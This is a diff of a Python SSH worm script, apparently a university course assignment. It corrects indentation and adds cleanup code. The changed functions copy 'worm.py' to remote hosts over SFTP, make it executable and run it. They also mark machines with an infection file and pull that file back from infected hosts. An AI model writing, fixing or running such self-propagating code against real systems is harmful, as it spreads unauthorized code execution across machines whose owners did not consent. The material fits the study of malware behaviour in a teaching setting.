@@ -29,8 +29,6 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 
-INFECTED_MARKER_FILE = "/tmp/infected.txt"
-
 def isInfectedSystem():
 	# Check if the system as infected. One
 	# approach is to check for a file called
@@ -49,8 +47,6 @@ def markInfected():
 	# in directory /tmp/
 
 	infected_mark =  open(INFECTED_MARKER_FILE,'w')
-
-	infected_mark.write = ("machine has been infected")
 
 	infected_mark.close()
 
@@ -74,13 +70,25 @@ def spreadAndExecute(sshClient):
 	
 	sftpClient = sshClient.open_sftp()
 
-    sftpClient.put("/tmp/worm.py", "/tmp/" + "worm.py")
+	sftpClient.put("/tmp/worm.py", "/tmp/" + "worm.py")
 
-    sshClient.exec_command("chmod a+x /tmp/worm.py")
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
 
-    sshClient.exec_command("python /tmp/worm.py ")
+	sshClient.exec_command("python /tmp/worm.py ")
 
+	sftpClient.close()
 
+	sshClient.close()
+
+def spreadAndClean(sshClient):
+	
+    sftpClient = sshClient.open_sftp()
+
+    sshClient.exec_command("rm /tmp/worm.py")
+
+    sftpClient.close()
+
+    sshClient.close()
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -277,7 +285,7 @@ def main():
 				try:
 					path = "/tmp/infected.txt"
 
-					localPath = "/home/"
+					localPath = "/home/cpsc/"
 
 					sftpClient = ssInfo[0]. open_sftp()
 					sftpClient.get(path, localPath)
@@ -321,6 +329,4 @@ def main():
 				# Infect that system
 					spreadAndExecute(sshInfo[0])
 				
-					print "Spreading complete"	
-		
-
+					print "Spreading complete"
